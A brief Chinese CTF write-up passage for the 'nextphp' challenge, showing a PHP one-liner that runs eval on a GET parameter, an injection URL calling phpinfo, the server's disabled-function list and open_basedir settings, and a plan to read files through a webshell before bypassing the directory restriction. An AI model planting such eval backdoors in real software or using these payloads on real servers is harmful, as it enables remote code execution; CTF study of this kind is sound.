nextphp

这个题首页给了一个一句话

```php
<?php
if (isset($_GET['a'])) {
    eval($_GET['a']);
} else {
    show_source(__FILE__);
}
```

利用方法http://xxxx/index.php?a=;phpinfo();

收集信息:

PHP 7.4.0

**diable_functions**:

```
set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl
```

**allow_url_fopen**                开启

**allow_url_include**             关闭

**open_basedir**                   /var/www/html

然后通过命令执行或者小马读取里面的文件



![2019-05-28 11-52-35 的屏幕截图](/home/aple/Documents/rctf2019/2019-05-28 11-52-35 的屏幕截图.png)

题目进行了限制目录，所以无法向上读取文件。

网上搜索open_basedir绕过